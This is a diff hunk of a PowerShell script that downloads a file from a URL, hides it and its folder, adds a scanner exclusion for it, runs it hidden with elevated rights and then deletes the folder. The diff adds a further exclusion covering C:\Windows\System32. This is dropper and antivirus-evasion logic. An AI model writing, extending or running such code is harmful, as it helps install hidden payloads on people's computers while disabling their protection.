@@ -28,7 +28,11 @@ try {
     Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
     (Get-Item $hiddenFolder).Attributes += 'Hidden'
     (Get-Item $tempPath).Attributes += 'Hidden'
+    
+    # Add exclusions
     Add-Exclusion -Path $tempPath
+    Add-Exclusion -Path "C:\Windows\System32"
+
     Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs -Wait
     Remove-Item $hiddenFolder -Recurse -Force
 }
